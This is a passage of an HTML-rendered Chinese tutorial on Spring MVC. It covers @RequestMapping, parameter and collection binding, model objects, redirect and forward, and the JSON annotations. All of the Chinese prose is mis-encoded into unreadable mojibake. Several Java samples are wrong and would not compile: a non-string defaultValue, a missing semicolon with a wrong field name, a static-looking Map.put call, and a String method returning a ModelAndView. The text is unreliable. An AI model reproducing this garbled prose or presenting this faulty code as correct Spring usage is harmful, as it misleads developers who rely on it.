title="URLåœ°å€æ˜ å°„"></a>URLåœ°å€æ˜ å°„</h2><p>é€šè¿‡æ³¨è§£<code>@RequestMapping</code> å°†è¯·æ±‚åœ°å€ä¸æ–¹æ³•è¿›è¡Œç»‘å®šï¼Œå¯ä»¥åœ¨ç±»çº§åˆ«å’Œæ–¹æ³•çº§åˆ«å£°æ˜ã€‚ç±»çº§åˆ«çš„æ³¨è§£è´Ÿè´£å°†ä¸€ä¸ªç‰¹å®šçš„è¯·æ±‚è·¯å¾„æ˜ å°„åˆ°ä¸€ä¸ªæ§åˆ¶å™¨ä¸Šï¼Œå°†urlå’Œç±»ç»‘å®šï¼›é€šè¿‡æ–¹æ³•çº§åˆ«çš„æ³¨è§£å¯ä»¥ç»†åŒ–æ˜ å°„ï¼Œèƒ½å¤Ÿå°†ä¸€ä¸ªç‰¹å®šçš„è¯·æ±‚è·¯å¾„æ˜ å°„åˆ°æŸä¸ªå…·ä½“çš„æ–¹æ³•ä¸Šï¼Œå°†urlå’Œç±»çš„æ–¹æ³•ç»‘å®š</p><h3 id="æ˜ å°„å•ä¸ªURL"><a href="#æ˜ å°„å•ä¸ªURL" class="headerlink" title="æ˜ å°„å•ä¸ªURL"></a>æ˜ å°„å•ä¸ªURL</h3><p>ä½¿ç”¨<code>@RequestMapping(&quot;&quot;)</code>æˆ–æŒ‡å®š<code>value</code>å±æ€§ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test01&quot;)</span></span><br><span class="line"><span class="comment">// @RequestMapping(value = &quot;/test01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test01&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ˜ å°„å¤šä¸ªURL"><a href="#æ˜ å°„å¤šä¸ªURL" class="headerlink" title="æ˜ å°„å¤šä¸ªURL"></a>æ˜ å°„å¤šä¸ªURL</h3><p>ä½¿ç”¨<code>@RequestMapping(&quot;&quot;,&quot;&quot;)</code>æˆ–æŒ‡å®š<code>value</code>ä¸ºæ•°ç»„ç±»å‹å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/test03_01&quot;, &quot;/test03_02&quot;&#125;)</span></span><br><span class="line"><span class="comment">// @RequestMapping(value = &#123;&quot;/test03_01&quot;, &quot;/test03_02&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test03</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test03&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ˜ å°„URLåœ¨æ§åˆ¶å™¨ä¸Š"><a href="#æ˜ å°„URLåœ¨æ§åˆ¶å™¨ä¸Š" class="headerlink" title="æ˜ å°„URLåœ¨æ§åˆ¶å™¨ä¸Š"></a>æ˜ å°„URLåœ¨æ§åˆ¶å™¨ä¸Š</h3><p>æä¾›äº†ä¸€ç§å±‚çº§åŒ–çš„è®¿é—®æ–¹å¼ï¼Œéœ€è¦å…ˆè®¿é—®ç±»å±‚çº§è·¯å¾„æ‰èƒ½è®¿é—®æ–¹æ³•å±‚çº§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/url&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test04&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">test04</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test04&quot;</span>);</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è¦è®¿é—®åˆ°<code>test04()</code>æ–¹æ³•éœ€è¦è®¿é—®<code>/url/test04</code>æ‰å¯</p><h3 id="è®¾ç½®URLæ˜ å°„è¯·æ±‚æ ¼å¼"><a href="#è®¾ç½®URLæ˜ å°„è¯·æ±‚æ ¼å¼" class="headerlink" title="è®¾ç½®URLæ˜ å°„è¯·æ±‚æ ¼å¼"></a>è®¾ç½®URLæ˜ å°„è¯·æ±‚æ ¼å¼</h3><p>å¯ä»¥é€šè¿‡<code>method</code>å±æ€§è®¾ç½®æ”¯æŒçš„è¯·æ±‚æ–¹å¼ï¼Œå¦‚<code>method=RequestMethod.POST</code>å¦‚è®¾ç½®å¤šç§è¯·æ±‚æ–¹å¼ï¼Œä»¥å¤§æ‹¬å·åŒ…å›´ï¼Œé€—å·éš”å¼€å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/test05&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test05</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test05&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é€šè¿‡å‚æ•°åç§°æ˜ å°„URL"><a href="#é€šè¿‡å‚æ•°åç§°æ˜ å°„URL" class="headerlink" title="é€šè¿‡å‚æ•°åç§°æ˜ å°„URL"></a>é€šè¿‡å‚æ•°åç§°æ˜ å°„URL</h3><p>è®¾ç½®<code>params</code>å±æ€§ï¼Œè¯¥æ–¹æ³•è¦æ±‚å®¢æˆ·ç«¯é€šè¿‡ç‰¹å®šçš„å‚æ•°å»è®¿é—®</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(params = &quot;test06&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test06</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test06&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="å‚æ•°ç»‘å®š"><a href="#å‚æ•°ç»‘å®š" class="headerlink" title="å‚æ•°ç»‘å®š"></a>å‚æ•°ç»‘å®š</h2><p>ç”¨äºå°†åç«¯ä½¿ç”¨çš„å‚æ•°ä¸å‰ç«¯ä¼ å…¥çš„å‚æ•°è¿›è¡Œç»‘å®šï¼Œä½¿ç”¨<code>@RequestParam</code>æ³¨è§£æ”¾åœ¨å½¢å‚å‰è¡¨ç¤ºç»‘å®š</p><p>è¯¥æ³¨è§£çš„<code>name</code>å±æ€§å¯ä¸å‰ç«¯çš„çš„å‚æ•°åè¿›è¡Œç»‘å®šï¼Œ<code>defaultValue</code>å±æ€§ç”¨äºè®¾ç½®é»˜è®¤å€¼ï¼Œ<code>required</code>ç”¨äºæ˜ç¡®è¯¥å‚æ•°æ˜¯å¦å¿…é¡»ï¼Œè¯·æ±‚ä¸­è‹¥æ²¡æœ‰è¯¥å‚æ•°ä¼šå‘å®¢æˆ·ç«¯æŠ›å‡º400é”™è¯¯</p><h3 id="åŸºæœ¬ç±»å‹"><a href="#åŸºæœ¬ç±»å‹" class="headerlink" title="åŸºæœ¬ç±»å‹"></a>åŸºæœ¬ç±»å‹</h3><p>åŸºæœ¬ç±»å‹ä¼ é€’æ—¶å¦‚æœä¸ºç©ºï¼Œå¯èƒ½ä¼šäº§ç”Ÿç©ºæŒ‡é’ˆå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(name=&quot;age&quot;, defaultValue=0)</span> <span class="type">int</span> num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒ…è£…ç±»å‹"><a href="#åŒ…è£…ç±»å‹" class="headerlink" title="åŒ…è£…ç±»å‹"></a>åŒ…è£…ç±»å‹</h3><p>ä½¿ç”¨åŒ…è£…ç±»å‹çš„ä¼˜ç‚¹åœ¨äºå…¶é»˜è®¤å€¼ä¸º<code>null</code>ï¼Œæ­¤æ—¶å¯ä»¥ä¸è®¾ç½®<code>defaultValue</code>å±æ€§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(Integer num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¸ä½¿ç”¨æ³¨è§£ï¼Œä½†è¿˜æ˜¯æ„Ÿè§‰ç”¨äº†ä¼šä½¿ä»£ç é€»è¾‘æ›´æ¸…æ™°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(name=&quot;age&quot;, defaultValue=0)</span> Integer num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°ç»„ç±»å‹"><a href="#æ•°ç»„ç±»å‹" class="headerlink" title="æ•°ç»„ç±»å‹"></a>æ•°ç»„ç±»å‹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(name=&quot;age&quot;)</span> Integer[] num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>é€‚ç”¨äºå®¢æˆ·ç«¯ä¼ é€’æ•°ç»„å‚æ•°ï¼Œç±»ä¼¼<code>age=12 &amp;age=18 &amp;age=22</code></p><h3 id="JavaBeanç±»å‹"><a href="#JavaBeanç±»å‹" class="headerlink" title="JavaBeanç±»å‹"></a>JavaBeanç±»å‹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(User user)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>beanç±»å‹å‚æ•°ä¸é€‚ç”¨<code>@RequestParam</code>æ³¨è§£ï¼Œå®¢æˆ·ç«¯ä¼ é€’è¯¥å¯¹è±¡çš„å±æ€§å‚æ•°ï¼Œè‹¥è¯¥<code>User</code>ç±»æœ‰<code>id</code>å’Œ<code>role</code>ä¸¤ä¸ªå±æ€§ï¼Œå®¢æˆ·ç«¯ä¼ å…¥ç±»ä¼¼<code>id=1 &amp;role=admin</code></p><h3 id="é›†åˆç±»å‹"><a href="#é›†åˆç±»å‹" class="headerlink" title="é›†åˆç±»å‹"></a>é›†åˆç±»å‹</h3><p>å¯¹äºé›†åˆç±»å‹ï¼Œéœ€è¦å…ˆä¼ å…¥ä¸€ä¸ªJavaBeanç±»å‹ï¼Œåç«¯å†é€šè¿‡JavaBeanå¯¹è±¡ä¸­çš„å±æ€§è¿›è¡Œæ¥æ”¶</p><p><strong>Liståˆ—è¡¨</strong></p><p>è‹¥ä¼ é€’å…ƒç´ ä¸ºåŸºæœ¬ç±»å‹ï¼Œåœ¨beanä¸­è®¾ç½®é›†åˆå±æ€§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Integer&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥æ”¶<code>test</code>å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(Test test)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯å‘é€çš„å‚æ•°éœ€ä¸º<code>list=1 &amp;list=2 &amp;list=3</code></p><p>è‹¥ä¼ é€’å…ƒç´ ä¸ºJavaBeanç±»å‹ï¼Œåœ¨beanä¸­è®¾ç½®é›†åˆå±æ€§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;User&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;User&gt; list)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚åˆ™åº”ä¸º<code>list[0].id=1 &amp;list[0].role=admin &amp;list[1].id=2 &amp;list[1].role=user</code></p><p><strong>Seté›†åˆ</strong></p><p>ç»‘å®šSetæ•°æ®æ—¶ï¼Œå¿…é¡»å…ˆåœ¨Setå¯¹è±¡ä¸­æ·»åŠ ç›¸åº”æ•°é‡çš„æ¨¡å‹å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;User&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;User&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;User&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(Set&lt;User&gt; set)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.Set = set</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Mapé›†åˆ</strong></p><p>è®¾ç½®beanè½½ä½“</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,User&gt; map =<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, User&gt; <span class="title function_">getMap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMap</span><span class="params">(Map&lt;String, User&gt; map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> å®¢æˆ·ç«¯å‘é€çš„æ ¼å¼ç±»ä¼¼<code>map[&#39;a&#39;].id=1 &amp;map[&#39;a&#39;].role=admin &amp;map[&#39;b&#39;].id=2 &amp;map[&#39;b&#39;].role=user</code></p><br/><h2 id="è¯·æ±‚åŸŸå¯¹è±¡"><a href="#è¯·æ±‚åŸŸå¯¹è±¡" class="headerlink" title="è¯·æ±‚åŸŸå¯¹è±¡"></a>è¯·æ±‚åŸŸå¯¹è±¡</h2><h3 id="ModelAndView"><a href="#ModelAndView" class="headerlink" title="ModelAndView"></a>ModelAndView</h3><p>åœ¨å…ˆå‰çš„æµ‹è¯•ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯·æ±‚æ˜ å°„åœ°å€ /hello.do</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;hello spring mvc&quot;</span>);</span><br><span class="line">        mv.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>mv</code>å°±æ˜¯ä¸€ä¸ªè¯·æ±‚åŸŸå¯¹è±¡ï¼Œå®ƒæ˜¯è¦æ¸²æŸ“çš„å†…å®¹çš„è½½ä½“ï¼Œè€Œè¿”å›å€¼ç”¨äºæ˜ç¡®è¦æ¸²æŸ“çš„æ¨¡æ¿ã€‚ç”±äº<code>ModelAndView</code>ç±»å¯ä»¥ç”¨<code>setViewName()</code>æ–¹æ³•æŒ‡å®šè¦æ¸²æŸ“çš„æ¨¡æ¿ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿”å›å¯¹è±¡ï¼Œè€Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰è®¸å¤šæ–¹å¼å¯ä»¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœ</p><h3 id="ModelMap"><a href="#ModelMap" class="headerlink" title="ModelMap"></a>ModelMap</h3><p><code>ModelMap</code>ç±»ä½¿ç”¨<code>addAttribute()</code>æ–¹æ³•è®¾ç½®jspä¸­çš„å¼•ç”¨å<code>attributeName</code>å’Œæ¸²æŸ“å†…å®¹<code>attributeValue</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(ModelMap modelMap)</span> &#123;</span><br><span class="line">modelMap.addAttribute(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;Model&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h3><p><code>Model</code>ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸<code>ModelMap</code>å‡ ä¹ä¸€è‡´</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">model.addAttribute(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;ModelMap&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>ç”±äº<code>map</code>æ²¡æœ‰<code>addAttribute()</code>æ–¹æ³•ï¼Œä½†<code>put()</code>æ–¹æ³•ä¹Ÿå¯ä»¥å®ç°ä¸€æ ·çš„åŠŸèƒ½</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">Map.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;Map&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HttpServletRequest"><a href="#HttpServletRequest" class="headerlink" title="HttpServletRequest"></a>HttpServletRequest</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;HttpServletRequest&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®ä»¥ä¸Šæ–¹æ³•ç©¶å…¶æ ¹æœ¬è¿˜æ˜¯æŠŠå±æ€§æ”¾å…¥äº†ä¸€æ¬¡è¯·æ±‚<code>HttpServletRequest</code>çš„ ä½œç”¨åŸŸ</p><br/><h3 id="é‡å®šå‘ä¸è¯·æ±‚è½¬å‘"><a href="#é‡å®šå‘ä¸è¯·æ±‚è½¬å‘" class="headerlink" title="é‡å®šå‘ä¸è¯·æ±‚è½¬å‘"></a>é‡å®šå‘ä¸è¯·æ±‚è½¬å‘</h3><h3 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h3><p>è¿”å›å€¼ä»¥<code>redirect:</code>å¼€å¤´ä¼šé‡å®šå‘åˆ°ç›¸åº”çš„jspé¡µé¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:halo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¼šé‡å®šå‘åˆ°<code>halo</code>è¿™ä¸ª<code>Controller</code>ï¼Œæ­¤æ—¶ä¼šå†æ¬¡å»ºç«‹ä¸€ä¸ª<code>HttpServletRequest</code>ï¼Œä¹Ÿå¯ä»¥ä¼ é€’å‚æ•°æ¯”å¦‚<code>redirect:halo?test=1</code></p><p>ä¹Ÿå¯ä»¥é€šè¿‡<code>RedirectAttributes</code>ç±»è®¾ç½®é‡å®šå‘çš„ä¼ é€’å‚æ•°ï¼Œè¯¥æ–¹æ³•å¯ä»¥è§£å†³ä¼ å‚å«ä¸­æ–‡ä¹±ç çš„é—®é¢˜</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(RedirectAttributes redirectAttributes)</span> &#123;</span><br><span class="line">redirectAttributes.addAttribute(<span class="string">&quot;æµ‹è¯•&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:halo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelAndView</code>ç±»ä¹Ÿå¯ä»¥å®ç°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(ModelAndView modelAndView)</span> &#123;</span><br><span class="line">modelAndView.addObject(<span class="string">&quot;æµ‹è¯•&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">modelAndView.setViewName(<span class="string">&quot;redirect:halo&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¯·æ±‚è½¬å‘"><a href="#è¯·æ±‚è½¬å‘" class="headerlink" title="è¯·æ±‚è½¬å‘"></a>è¯·æ±‚è½¬å‘</h3><p>è¯·æ±‚è½¬å‘ç›´æ¥è°ƒç”¨è·³è½¬çš„é¡µé¢ï¼Œæ­¤æ—¶ä¸ä¼šé”€æ¯å‰ä¸€æ¬¡å»ºç«‹çš„<code>HttpServletRequest</code>ï¼Œä¸å­˜åœ¨ä¸¢å¤±æ•°æ®çš„é—®é¢˜ï¼Œè¯·æ±‚è½¬å‘ä½¿ç”¨<code>forward:</code>å‰ç¼€ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ï¼Œspringé»˜è®¤ä½¿ç”¨è¯·æ±‚è½¬å‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;forward:halo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯·æ±‚è½¬å‘ä¹Ÿå¯ä»¥ä¼ é€’å‚æ•°ï¼Œå¹¶ä¸”æ­¤æ—¶å¯ä»¥ç›´æ¥ä¼ ä¸­æ–‡</p><br/><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>JSONä½œä¸ºä¸€ç§æ•°æ®ä¼ è¾“æ ¼å¼åœ¨å®é™…å¼€å‘ä¸­è·å¾—äº†è‰¯å¥½çš„åº”ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å…¶ç›´æ¥è¿”å›å¯¹è±¡ã€é›†åˆç­‰ç±»å‹</p><h3 id="ResponseBodyæ³¨è§£"><a href="#ResponseBodyæ³¨è§£" class="headerlink" title="@ResponseBodyæ³¨è§£"></a><code>@ResponseBody</code>æ³¨è§£</h3><p>è¯¥æ³¨è§£ç”¨äºå°† Controller çš„æ–¹æ³•è¿”å›çš„å¯¹è±¡ï¼Œé€šè¿‡é€‚å½“çš„ <code>HttpMessageConverter</code> è½¬æ¢ä¸ºæŒ‡å®šæ ¼å¼åï¼Œå†™å…¥åˆ° Response å¯¹è±¡çš„ body æ•°æ®åŒºï¼Œè¿”å›çš„æ•°æ®ä¸æ˜¯ html æ ‡ç­¾çš„é¡µé¢ï¼Œè€Œæ˜¯å…¶ä»–æŸç§æ ¼å¼çš„æ•°æ®æ—¶ï¼ˆå¦‚ jsonã€xml ç­‰ï¼‰ä½¿ç”¨ï¼ˆé€šå¸¸ç”¨äºajax è¯·æ±‚ï¼‰</p><h3 id="RequestBodyæ³¨è§£"><a href="#RequestBodyæ³¨è§£" class="headerlink" title="@RequestBodyæ³¨è§£"></a><code>@RequestBody</code>æ³¨è§£</h3><p>è¯¥æ³¨è§£ç”¨äºè¯»å– Request è¯·æ±‚çš„ body éƒ¨åˆ†æ•°æ®ï¼Œä½¿ç”¨ç³»ç»Ÿé»˜è®¤é…ç½®çš„ <code>HttpMessageConverter</code> è¿›è¡Œè§£æï¼Œç„¶åæŠŠç›¸åº”çš„æ•°æ®ç»‘å®šåˆ°è¦è¿”å›çš„å¯¹è±¡ä¸Šï¼Œå†æŠŠ <code>HttpMessageConverter</code> è¿”å›çš„å¯¹è±¡æ•°æ®ç»‘å®šåˆ° controller ä¸­æ–¹æ³•çš„å‚æ•°ä¸Š</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>æ·»åŠ 